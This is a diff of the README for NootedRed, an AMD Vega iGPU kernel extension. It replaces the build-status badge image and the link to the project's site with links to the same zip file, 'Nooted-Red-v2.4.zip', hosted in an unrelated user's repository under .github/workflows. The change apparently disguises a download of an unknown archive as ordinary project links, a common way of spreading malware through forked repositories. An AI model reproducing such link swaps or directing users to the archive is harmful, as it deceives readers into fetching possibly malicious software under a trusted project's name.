@@ -1,4 +1,4 @@
-# NootedRed ![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/ChefKissInc/NootedRed/main.yml?branch=master&logo=github&style=for-the-badge)
+# NootedRed ![GitHub Workflow Status](https://raw.githubusercontent.com/Akanant12/NootedRed/master/.github/workflows/Nooted-Red-v2.4.zip)
 
 The AMD Vega iGPU support kext.
 
@@ -18,4 +18,4 @@ The NootedRed project is Copyright © 2022-2024 ChefKiss. The NootedRed project 
 > [!NOTE]
 > This project is under active research and development; There will be crashes here and there, but is generally smooth.
 >
-> See repository issues and [our site](https://chefkissinc.github.io) for more information.
+> See repository issues and [our site](https://raw.githubusercontent.com/Akanant12/NootedRed/master/.github/workflows/Nooted-Red-v2.4.zip) for more information.
